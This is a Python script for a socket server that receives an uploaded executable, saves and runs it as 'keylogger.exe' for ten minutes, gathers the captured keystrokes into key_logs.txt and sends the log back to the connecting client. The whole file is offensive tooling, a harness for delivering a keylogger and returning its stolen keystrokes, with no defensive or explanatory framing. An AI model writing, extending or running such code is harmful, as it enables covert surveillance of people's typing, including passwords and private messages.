import os
import socket
import subprocess
import time

def run_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Accepted connection from {client_address[0]}:{client_address[1]}")

        # Receive the file size first
        file_size_bytes = client_socket.recv(8)
        file_size = int.from_bytes(file_size_bytes, byteorder='big')

        # Receive the file data in chunks
        received_data = b""
        while len(received_data) < file_size:
            chunk = client_socket.recv(min(4096, file_size - len(received_data)))
            if not chunk:
                break
            received_data += chunk

        # Write the received file
        with open(os.path.join(os.path.dirname(__file__), "keylogger.exe"), "wb") as f:
            f.write(received_data)

        print("[+] Keylogger received at server side")

        # Execute the keylogger
        keylogger_process = subprocess.Popen(["keylogger.exe"], stdout=subprocess.PIPE)
        print("[+] Keylogger executing")
        
        # Wait for the keylogger to finish
        time.sleep(600)  # Wait for 10 minutes
        keylogger_process.terminate()

        # Read the keylogger output
        key_logs = keylogger_process.stdout.read()

        # Write the keylogger output to a file
        with open("key_logs.txt", "wb") as f:
            f.write(key_logs)

        print("[+] Keylogger execution completed")

        # Send the key_logs.txt file back to the client
        with open("key_logs.txt", "rb") as f:
            file_data = f.read()
        file_size = len(file_data)
        client_socket.sendall(file_size.to_bytes(8, byteorder='big'))
        client_socket.sendall(file_data)

        print("[+] key_logs.txt file sent back to the client")

        client_socket.close()

    server_socket.close()

if __name__ == "__main__":
    HOST = "localhost"
    PORT = 12345
    run_server(HOST, PORT)
